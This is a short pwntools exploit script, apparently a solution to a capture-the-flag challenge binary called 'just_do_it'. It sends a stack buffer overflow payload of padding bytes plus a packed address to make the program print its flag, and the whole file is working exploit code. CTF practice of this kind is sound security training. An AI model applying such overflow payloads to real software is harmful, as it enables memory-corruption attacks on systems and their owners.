from pwn import *

context.log_level = "debug"
context.terminal = ["wezterm", "start", "--"]

flag_addr = 0x804A080

p = process(b"./just_do_it")
# gdb.attach(p, api=True)
p.recvline()
p.recvline()
p.sendline(b"A" * 16 + b"B" * 4 + p32(flag_addr))
p.recvall()
